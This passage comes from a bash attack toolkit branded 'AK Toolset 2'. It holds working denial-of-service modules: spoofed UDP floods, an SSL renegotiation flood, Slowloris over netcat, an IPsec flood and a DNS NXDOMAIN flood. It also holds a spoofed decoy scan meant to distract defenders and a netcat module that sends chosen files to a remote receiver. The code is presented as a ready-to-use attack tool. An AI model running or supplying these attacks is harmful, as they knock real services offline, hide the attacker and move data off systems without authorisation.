	else echo "Using Port $PORT"
	fi
#what data should we send with each packet?
#curently only accepts stdin.  Can't define a file to read from
	echo "Enter random string (data to send):"
		read DATA
#what source IP should we write to sent packets?
	echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
		read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
#start the attack using values defined earlier
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting UDP Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood --spoof $SOURCE --udp --sign $DATA -p $PORT $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting UDP Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood --rand-source --udp --sign $DATA -p $PORT $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting UDP Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood --udp --sign $DATA -p $PORT $TARGET
#if no valid source option is selected, use outgoing interface IP
	else echo "Not a valid option!  Using interface IP"
		echo "Starting UDP Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood --udp --sign $DATA -p $PORT $TARGET
	fi
#If no hping3, use nping for UDP Flood instead.  Not ideal but it will work.
	else echo "hping3 not found :( trying nping instead"
		echo ""
		echo "Trying UDP Flood with nping.."
		echo "Enter target:"
#need a valid target IP/hostname
	read -i $TARGET -e TARGET
		echo "Enter target port (defaults to 80):"
#need a port to send UDP packets to
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#what source address should we use in sent packets?
		echo "Enter Source IP or use [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
		: ${SOURCE:=i}
#how many packets should we try to send each second?
		echo "Enter number of packets to send per second (default is 10,000):"
	read RATE
		: ${RATE:=10000}
#how many packets should we send in total?
		echo "Enter total number of packets to send (default is 100,000):"
	read TOTAL
		: ${TOTAL:=100000}
#default values will send 10k packets each second, for 10 seconds
#what data should we send with each packet?
#curently only accepts stdin.  Can't define a file to read from
		echo "Enter string to send (data):"
	read DATA
		echo "Starting UDP Flood..."
#start the UDP flood using values we defined earlier
	if 	[ "$SOURCE" = "i" ]; then
		sudo nping --udp --dest-port $PORT --data-string $DATA --rate $RATE -c $TOTAL -v-1 $TARGET
	else sudo nping --udp --dest-port $PORT --data-string $DATA --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
	fi
fi
}
##END UDPFLOOD##
################

################
##START SSLDOS##
ssldos()
{ echo "Using openssl for SSL/TLS DOS"
		echo "Enter target:"
#need a target IP/hostname
	read -i $TARGET -e TARGET
#need a target port
		echo "Enter target port (defaults to 443):"
read -i $PORT -e PORT
: ${PORT:=443}
#check a valid target port is entered otherwise assume port 443
if  ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
	PORT=443 && echo "You provided a string, not a port number!  Reverting to port 443"
fi
if [ "$PORT" -lt "1" ]; then
	PORT=443 && echo "Invalid port number chosen!  Reverting to port 443"
elif [ "$PORT" -gt "65535" ]; then
	PORT=443 && echo "Invalid port number chosen!  Reverting to port 443"
else echo "Using port $PORT"
fi
#do we want to use client renegotiation?
	echo "Use client renegotiation? [y]es or [n]o (default):"
read NEGOTIATE
: ${NEGOTIATE:=n}
if [[ $NEGOTIATE = y ]]; then
#if client renegotiation is selected for use, launch the attack supporting it
	echo "Starting SSL DOS attack...Use 'Ctrl c' to quit" && sleep 1
while : for i in {1..10}
	do echo "spawning instance, attempting client renegotiation"; echo "R" | openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null &
done
elif [[ $NEGOTIATE = n ]]; then
#if client renegotiation is not requested, lauch the attack without support for it
	echo "Starting SSL DOS attack...Use 'Ctrl c' to quit" && sleep 1
while : for i in {1..10}
	do echo "spawning instance"; openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null &
done
#if an invalid option is chosen for client renegotiation, launch the attack without it
else
	echo "Invalid option, assuming no client renegotiation"
	echo "Starting SSL DOS attack...Use 'Ctrl c' to quit" && sleep 1
while : for i in {1..10}
	do echo "spawning instance"; openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null &
done
fi
#The SSL/TLS DOS code is crude but it can be brutally effective
}
##END SSLDOS##
##############

##################
##START SLOWLORIS##
slowloris()
{ echo "Using netcat for Slowloris attack...." && sleep 1
echo "Enter target:"
#need a target IP or hostname
	read -i $TARGET -e TARGET
echo "Target is set to $TARGET"
#need a target port
echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#how many connections should we attempt to open with the target?
#there is no hard limit, it depends on available resources.  Default is 2000 simultaneous connections
echo "Enter number of connections to open (default 2000):"
		read CONNS
	: ${CONNS:=2000}
#ensure a valid integer is entered
	if ! [[ "$CONNS" =~ ^[0-9]+$ ]]; then
CONNS=2000 && echo "Invalid integer!  Using 2000 connections"
	fi
#how long do we wait between sending header lines?
#too long and the connection will likely be closed
#too short and our connections have little/no effect on server
#either too long or too short is bad.  Default random interval is a sane choice
echo "Choose interval between sending headers."
echo "Default is [r]andom, between 5 and 15 seconds, or enter interval in seconds:"
	read INTERVAL
	: ${INTERVAL:=r}
	if [[ "$INTERVAL" = "r" ]]
then
#if default (random) interval is chosen, generate a random value between 5 and 15
#note that this module uses $RANDOM to generate random numbers, it is sufficient for our needs
INTERVAL=$((RANDOM % 11 + 5))
#check that r (random) or a valid number is entered
	elif ! [[ "$INTERVAL" =~ ^[0-9]+$ ]] && ! [[ "$INTERVAL" = "r" ]]
then
#if not r (random) or valid number is chosen for interval, assume r (random)
INTERVAL=$((RANDOM % 11 + 5)) && echo "Invalid integer!  Using random value between 5 and 15 seconds"
	fi
#run stunnel_client function
stunnel_client
if [[ "$SSL" = "y" ]]
then
#if SSL is chosen, set the attack to go through local stunnel listener
echo "Launching Slowloris....Use 'Ctrl c' to exit prematurely" && sleep 1
	i=1
	while [ "$i" -le "$CONNS" ]; do
echo "Slowloris attack ongoing...this is connection $i, interval is $INTERVAL seconds"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $LHOST $LPORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
echo "Opened $CONNS connections....returning to menu"
else
#if SSL is not chosen, launch the attack on the server without using a local listener
echo "Launching Slowloris....Use 'Ctrl c' to exit prematurely" && sleep 1
	i=1
	while [ "$i" -le "$CONNS" ]; do
echo "Slowloris attack ongoing...this is connection $i, interval is $INTERVAL seconds"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $TARGET $PORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
#return to menu once requested number of connections has been opened or resources are exhausted
echo "Opened $CONNS connections....returning to menu"
fi
}
##END SLOWLORIS##
#################

###################
##START IPSEC DOS##
ipsecdos()
{ echo "This module will attempt to spoof an IPsec server, with a spoofed source address"
echo "Enter target IP or hostname:"
read -i $TARGET -e TARGET
#launch DOS with a random source address by default
echo "IPsec DOS underway...use 'Ctrl C' to stop" &&
while :
do sudo ike-scan -A -B 100M -t 1 --sourceip=random $TARGET 1>/dev/null; sudo ike-scan -B 100M -t 1 -q --sourceip=random $TARGET 1>/dev/null
done
}
##END IPSEC DOS##
#################

#####################
##START DISTRACTION##
distractionscan()
{ echo "This module will send a TCP SYN scan with a spoofed source address"
echo "This module is designed to be obvious, to distract your target from any real scan or other activity you may actually be performing"
echo "Enter target:"
#need target IP/hostname
read -i $TARGET -e TARGET
echo "Enter spoofed source address:"
#need a spoofed source address
read -i $SOURCE -e SOURCE
#use hping to perform multiple obvious TCP SYN scans
for i in {1..50}; do echo "sending scan $i" && sudo hping3 --scan all --spoof $SOURCE -S $TARGET 2>/dev/null 1>/dev/null; done
exit 0
}
##END DISTRACTION##
###################

#######################
##START NXDOMAINFLOOD##
nxdomainflood()
{ echo "This module is designed to stress test a DNS server by flooding it with queries for domains that do not exist"
echo "Enter the IP address of the target DNS server:"
read -i $DNSTARGET -e DNSTARGET
echo "Starting DNS NXDOMAIN Query Flood to $DNSTARGET" && sleep 1
echo "No output will be shown. Use 'Ctrl c' to stop!"
#loop forever!
while :
do
#create transaction ID for DNS query
TRANS=$RANDOM
#convert to hex
printf -v TRANSID "%x\n" "$TRANS"
#cut it into bytes
TRANSID1=$(echo $TRANSID|cut -b 1,2|xargs)
TRANSID2=$(echo $TRANSID|cut -b 3,4|xargs)
#if single byte or no byte, prepend 0
if [[ ${#TRANSID1} = "1" ]]
then
TRANSID1=0$TRANSID
elif [[ ${#TRANSID2} = "0" ]]
then
TRANSID2=00
elif [[ ${#TRANSID2} = "1" ]] 
then
TRANSID2=0$TRANSID
fi
#now we have transaction ID, generate random alphanumeric name to query
TLDLIST=(com br net org cz au co jp cn ru in ir ua ca xyz site top icu vip online de $RANDOM foo)
TLD=(${TLDLIST[RANDOM%22]})
RANDLONG=$((RANDOM % 20 +1))
STRING=$(< /dev/urandom tr -dc [:alnum:] | head -c$RANDLONG)
#calculate length of name we are querying as hex
STRINGLEN=(${#STRING})
printf -v STRINGLENHEX "%x\n" "$STRINGLEN"
STRINGLENHEX=$(echo $STRINGLENHEX|xargs)
if [[ ${#STRINGLENHEX} = "1" ]]
then 
STRINGLENHEX=0$STRINGLENHEX
fi
#do the same for TLD
TLDLEN=(${#TLD})
printf -v TLDLENHEX "%x\n" "$TLDLEN"
TLDLENHEX=$(echo $TLDLENHEX|xargs)
#forge a DNS request and send to netcat
ATTACKSTRING="\x$TRANSID1\x$TRANSID2\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x$STRINGLENHEX$STRING\x$TLDLENHEX$TLD\x00\x00\x01\x00\x01"
#echo $ATTACKSTRING
echo -n -e $ATTACKSTRING | nc -u -w0 $DNSTARGET 53
done
exit 0
}
##END NXDOMAINFLOOD##
#####################

##/DOS##


##EXTRACTION##
########################
##START EXTRACTIONMENU##
extractionmenu()
{
#display a menu for the extraction module using bash select
        extractionmenu=("Send File" "Create Listener" "Go back")
    select extractopt in "${extractionmenu[@]}"; do
#Extract file with TCP or UDP
    if [ "$extractopt" = "Send File" ]; then
        sendfile
#Create an arbitrary listener to receive files
    elif [ "$extractopt" = "Create Listener" ]; then
		listener
#Go back
    elif [ "$extractopt" = "Go back" ]; then
        mainmenu
#Default error if no valid option is chosen
    else
        echo "That's not a valid option! Hit Return to show menu"
    fi
    done
}
##END EXTRACTIONMENU##
######################

##################
##START SENDFILE##
sendfile()
	{ echo "This module will allow you to send a file over TCP or UDP"
	echo "You can use the Listener to receive such a file"
echo "Enter protocol, [t]cp (default) or [u]dp:"
	read -i $PROTO -e PROTO
	: ${PROTO:=t}
#if not t (tcp) or u (udp) is chosen, assume tcp required
if [ "$PROTO" != "t" ] && [ "$PROTO" != "u" ]; then
	echo "Invalid protocol option selected, assuming tcp!" && PROTO=t && echo ""
fi
echo "Enter the IP of the receving server:"
#need to know the IP of the receiving end
  read -i $RECEIVER -e RECEIVER
#need to know a destination port on the server
  echo "Enter port number for the destination server (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#what file are we sending?
  echo "Enter the FULL PATH of the file you want to extract:"
  read -i $EXTRACT -e EXTRACT
#send the file
echo "Sending the file to $RECEIVER:$PORT"
if [ "$PROTO" = "t" ]; then
nc -w 3 -n -N $RECEIVER $PORT < $EXTRACT
else
nc -n -N -u $RECEIVER $PORT < $EXTRACT
fi
echo "Done"
#generate hashes of file we are sending
echo "Generating hash checksums"
md5sum $EXTRACT
echo ""
sha512sum $EXTRACT
sleep 1
}
##END SENDFILE##
################

##################
##START LISTENER##
listener()
	{ echo "This module will create a TCP or UDP listener using netcat"
	echo "Any data (string or file) received will be written out to listener.out"
echo "Enter protocol, [t]cp (default) or [u]dp:"
	read -i $PROTO -e PROTO
	: ${PROTO:=t}
#if not t (tcp) or u (udp) is chosen, assume tcp listener required
if [ "$PROTO" != "t" ] && [ "$PROTO" != "u" ]; then
	echo "Invalid protocol option selected, assuming tcp!" && PROTO=t && echo ""
fi
#show listening ports on system using ss (if available) otherwise use netstat
	echo "Listing current listening ports on this system.  Do not attempt to create a listener on one of these ports, it will not work." && echo ""
if test -f "/bin/ss"; then
	LISTPORT=ss;
	else LISTPORT=netstat

fi
#now we can ask what port to create listener on
#it cannot of course listen on a port already in use
	$LISTPORT -$PROTO -n -l
echo "Enter port number to listen on (defaults to 8000):"
	read -i $PORT -e PORT
	: ${PORT:=8000}
#if not an integer is entered, assume default port 8000
if  ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
		PORT=8000 && echo "You provided a string, not a port number!  Reverting to port 8000"
fi
#ensure a valid port number, between 1 and 65,535 (inclusive) is entered
if [ "$PORT" -lt "1" ]; then
		PORT=8000 && echo "Invalid port number chosen!  Reverting to port 8000"
	elif [ "$PORT" -gt "65535" ]; then
		PORT=8000 && echo "Invalid port number chosen!  Reverting to port 8000"
fi
#define where to save everything received to the listener
echo "Enter output file (defaults to listener.out):"
	read -i $OUTFILE -e OUTFILE
	: ${OUTFILE:=ak404z.listener.out}
echo "Use ctrl c to stop"
#create the listener
if [ "$PROTO" = "t" ] && [ "$PORT" -lt "1025" ]; then
	sudo nc -n -l -v -p $PORT > $OUTFILE
elif  [ "$PROTO" = "t" ] && [ "$PORT" -gt "1024" ]; then
	nc -n -l -v -p $PORT > $OUTFILE
elif  [ "$PROTO" = "u" ] && [ "$PORT" -lt "1025" ]; then
	sudo nc -n -u -k -l -v -p $PORT > $OUTFILE
elif  [ "$PROTO" = "u" ] && [ "$PORT" -gt "1024" ]; then
	nc -n -u -k -l -v -p $PORT > $OUTFILE
fi
#done message and checksums will only work for tcp file transfer
#with udp, the connection has to be manually closed with 'ctrl C'
sync && echo "Done"
#generate hashes of file received
echo "Generating hash checksums"
md5sum $OUTFILE
echo ""
sha512sum $OUTFILE
sleep 1
}
##END LISTENER##
################
##/EXTRACTION##


##README##
####################
##START SHOWREADME##
showreadme()
{
    echo "==========================================================="
    echo "          Telegram : https://t.me/AKHacking1             "
    echo "            Github : https://github.com/ak404z             "
    echo "           Youtube : https://www.youtube.com/@ak404z             "
    echo "            Tiktok : https://www.tiktok.com/@ak404z             "
    echo "               X   : https://x.com/ak404z            "
    echo "         Instagram : https://www.instagram.com/ak404z            "
    echo "==========================================================="
    echo ""
    mainmenu
}
stunnel_client()
{ echo "use SSL/TLS? [y]es or [n]o (default):"
	read SSL
	: ${SSL:=n}
#if not using SSL/TLS, carry on what we were doing
#otherwise create an SSL/TLS tunnel using a local listener on TCP port 9991
if [[ "$SSL" = "y" ]]
	then echo "Using SSL/TLS"
LHOST=127.0.0.1
LPORT=9991
#ascertain if stunnel is defined in /etc/services and if not, add it & set permissions correctly
grep -q $LPORT /etc/services
if [[ $? = 1 ]]
then
echo "Adding ak404z stunnel service to /etc/services" && sudo chmod 777 /etc/services && sudo echo "ak404z-stunnel-client 9991/tcp #ak404z stunnel client listener" >> /etc/services &&  sudo chmod 644 /etc/services
fi
#is ss is available, use that to shoew listening ports
if test -f "/bin/ss"; then
	LISTPORT=ss;
#otherwise use netstat
	else LISTPORT=netstat
fi
#show listening ports and check for port 9991
$LISTPORT -tln |grep -q $LPORT
if [[ "$?" = "1" ]]
#if nothing is running on port 9991, create stunnel configuration
then
	echo "Creating stunnel client on $LHOST:$LPORT"
		sudo rm -f /etc/stunnel/ak404z.conf;
		sudo touch /etc/stunnel/ak404z.conf && sudo chmod 777 /etc/stunnel/ak404z.conf
		sudo echo "[ak404z-CLIENT]" >> /etc/stunnel/ak404z.conf
		sudo echo "client=yes" >> /etc/stunnel/ak404z.conf
		sudo echo "accept=$LHOST:$LPORT" >> /etc/stunnel/ak404z.conf
		sudo echo "connect=$TARGET:$PORT" >> /etc/stunnel/ak404z.conf
		sudo echo "verify=0" >> /etc/stunnel/ak404z.conf
		sudo chmod 644 /etc/stunnel/ak404z.conf
		sudo stunnel /etc/stunnel/ak404z.conf && sleep 1
#if stunnel listener is already active we don't bother recreating it
else echo "Looks like stunnel is already listening on port 9991, so not recreating"
fi
fi }
##END STUNNEL##
###############
##/GENERIC##


##WELCOME##
#########################
##START WELCOME MESSAGE##
#everything before this is a function and functions have to be defined before they can be used
#so the welcome message MUST be placed at the end of the script
	clear && echo ""
echo "==========================================================="
echo "       Welcome to AK Toolset 2 ! Choose an option below       " 
echo "            Telegram : https://t.me/AKHacking1             "
echo "            Github : https://github.com/ak404z             "
echo "==========================================================="
echo ""
mainmenu
##END WELCOME MESSAGE##
#######################
##/WELCOME##
